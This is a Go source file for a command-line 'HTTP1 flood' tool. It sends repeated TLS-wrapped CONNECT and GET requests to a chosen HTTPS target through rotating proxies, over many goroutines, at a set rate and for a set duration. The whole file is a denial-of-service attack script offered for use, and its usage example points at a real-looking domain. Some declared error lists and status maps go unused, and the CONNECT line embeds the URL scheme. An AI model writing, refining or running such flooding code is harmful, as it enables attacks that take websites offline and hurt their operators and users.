package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var (
	ignoreNames = []string{
		"RequestError", "StatusCodeError", "CaptchaError", "CloudflareError",
		"ParseError", "ParserError", "TimeoutError", "JSONError", "URLError",
		"InvalidURL", "ProxyError",
	}
	ignoreCodes = []string{
		"SELF_SIGNED_CERT_IN_CHAIN", "ECONNRESET", "ERR_ASSERTION", "ECONNREFUSED",
		"EPIPE", "EHOSTUNREACH", "ETIMEDOUT", "ESOCKETTIMEDOUT", "EPROTO",
		"EAI_AGAIN", "EHOSTDOWN", "ENETRESET", "ENETUNREACH", "ENONET",
		"ENOTCONN", "ENOTFOUND", "EAI_NODATA", "EAI_NONAME", "EADDRNOTAVAIL",
		"EAFNOSUPPORT", "EALREADY", "EBADF", "ECONNABORTED", "EDESTADDRREQ",
		"EDQUOT", "EFAULT", "EHOSTUNREACH", "EIDRM", "EILSEQ",
		"EINPROGRESS", "EINTR", "EINVAL", "EIO", "EISCONN",
		"EMFILE", "EMLINK", "EMSGSIZE", "ENAMETOOLONG", "ENETDOWN",
		"ENOBUFS", "ENODEV", "ENOENT", "ENOMEM", "ENOPROTOOPT",
		"ENOSPC", "ENOSYS", "ENOTDIR", "ENOTEMPTY", "ENOTSOCK",
		"EOPNOTSUPP", "EPERM", "EPIPE", "EPROTONOSUPPORT", "ERANGE",
		"EROFS", "ESHUTDOWN", "ESPIPE", "ESRCH", "ETIME",
		"ETXTBSY", "EXDEV", "UNKNOWN", "DEPTH_ZERO_SELF_SIGNED_CERT",
		"UNABLE_TO_VERIFY_LEAF_SIGNATURE", "CERT_HAS_EXPIRED", "CERT_NOT_YET_VALID",
		"ERR_SOCKET_BAD_PORT",
	}
	statuses   = make(map[string]int)
	statusesQ  = []map[string]int{}
	statusLock sync.Mutex
)

func main() {
	if len(os.Args) < 6 {
		printUsage()
		os.Exit(0)
	}

	target := os.Args[1]
	duration, _ := strconv.Atoi(os.Args[2])
	threads, _ := strconv.Atoi(os.Args[3])
	rate, _ := strconv.Atoi(os.Args[4])
	proxyFile := os.Args[5]

	if !strings.HasPrefix(target, "https://") {
		errorAndExit("Invalid target address (https only)!")
	}
	if duration <= 0 {
		errorAndExit("Invalid duration format!")
	}
	if threads <= 0 {
		errorAndExit("Invalid threads format!")
	}
	if rate <= 0 {
		errorAndExit("Invalid ratelimit format!")
	}

	proxies := readProxies(proxyFile)
	if len(proxies) == 0 {
		errorAndExit("Proxy file is empty!")
	}

	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			attack(target, duration, rate, proxies)
		}()
	}
	wg.Wait()
}

func printUsage() {
	fmt.Println(`
    HTTP1 flood

    Usage:
        go run main.go [target] [duration] [threads] [rate] [proxyfile]
    
    Example:
        go run main.go https://ars.com 300 5 90 proxies.txt
    `)
}

func readProxies(file string) []string {
	f, err := os.Open(file)
	if err != nil {
		log.Fatal(err)
	}
	defer f.Close()

	var proxies []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		proxies = append(proxies, strings.TrimSpace(scanner.Text()))
	}
	return proxies
}

func errorAndExit(msg string) {
	fmt.Printf("[error] %s\n", msg)
	os.Exit(1)
}

func attack(target string, duration, rate int, proxies []string) {
	startTime := time.Now()
	for time.Since(startTime) < time.Duration(duration)*time.Second {
		proxy := proxies[rand.Intn(len(proxies))]
		go sendRequest(target, proxy, rate)
		time.Sleep(time.Duration(1000/rate) * time.Millisecond)
	}
}

func sendRequest(target, proxy string, rate int) {
	proxyParts := strings.Split(proxy, ":")
	proxyHost := proxyParts[0]
	proxyPort := proxyParts[1]

	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%s", proxyHost, proxyPort))
	if err != nil {
		return
	}
	defer conn.Close()

	config := &tls.Config{
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS13,
	}
	tlsConn := tls.Client(conn, config)

	if err := tlsConn.Handshake(); err != nil {
		return
	}

	request := fmt.Sprintf("CONNECT %s:443 HTTP/1.1\r\nHost: %s:443\r\nProxy-Connection: Keep-Alive\r\n\r\n", target, target)
	_, err = tlsConn.Write([]byte(request))
	if err != nil {
		return
	}

	readResponse(tlsConn)

	// Send the HTTP request
	httpRequest := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n", target, target)
	_, err = tlsConn.Write([]byte(httpRequest))
	if err != nil {
		return
	}

	readResponse(tlsConn)

	tlsConn.Close()
}

func readResponse(tlsConn *tls.Conn) {
	reader := bufio.NewReader(tlsConn)
	for {
		line, err := reader.ReadString('\n')
		if err != nil {
			break
		}
		fmt.Print(line)
	}
}
